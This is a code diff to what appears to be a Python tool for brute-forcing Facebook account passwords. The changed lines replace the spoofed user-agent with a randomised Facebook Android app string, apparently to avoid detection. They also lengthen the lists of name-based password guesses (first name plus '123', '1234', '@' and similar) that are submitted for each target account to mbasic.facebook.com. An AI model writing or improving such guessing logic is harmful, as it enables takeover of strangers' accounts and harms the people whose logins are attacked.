@@ -61,7 +61,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
@@ -262,10 +262,10 @@ class __xxx__:
                         firsts = first.capitalize()
                         lasts = last.capitalize()
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"1122", xz[0]+"@", xz[0]+"@@", xz[0]+"@@@"]
                         else:
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"1122", xz[0]+"@", xz[0]+"@@", xz[0]+"@@@"]
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234", xz[0]+"111", xz[0]+"1122", xz[0]+"@", xz[0]+"@@", xz[0]+"@@@"]
                         ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
